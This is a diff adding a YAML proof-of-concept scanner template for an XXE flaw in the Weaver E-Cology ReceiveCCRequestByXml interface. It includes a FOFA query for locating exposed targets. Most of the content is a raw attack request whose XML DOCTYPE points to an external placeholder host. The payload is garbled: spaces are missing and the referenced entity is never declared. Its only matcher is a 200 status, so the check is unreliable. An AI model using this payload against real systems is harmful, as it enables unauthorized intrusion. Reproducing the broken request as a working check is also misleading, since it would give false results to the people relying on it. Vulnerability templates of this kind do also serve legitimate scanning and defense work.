@@ -1,0 +1,31 @@
+id: poc-ceipl8afg3r8qekk
+info:
+  name: 泛微E-Cology系统接口ReceiveCCRequestByXml存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ceipl8afg3r8qekk'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ceipl8afg3r8qekk
+    fofa: app="泛微-协同商务系统"
+http:
+- raw:
+  - 'POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
+
+    Host:{{Hostname}}
+
+    User-Agent:Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML, likeGecko)Chrome/71.0.3578.98Safari/537.36
+
+    Content-Type:application/xml
+
+    <?xmlversion="1.0"encoding="utf-8"?>
+
+    <!DOCTYPEsyscodeSYSTEM"http://xxx.xxxx.com">
+
+    <M><syscode>&send;</syscode></M>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
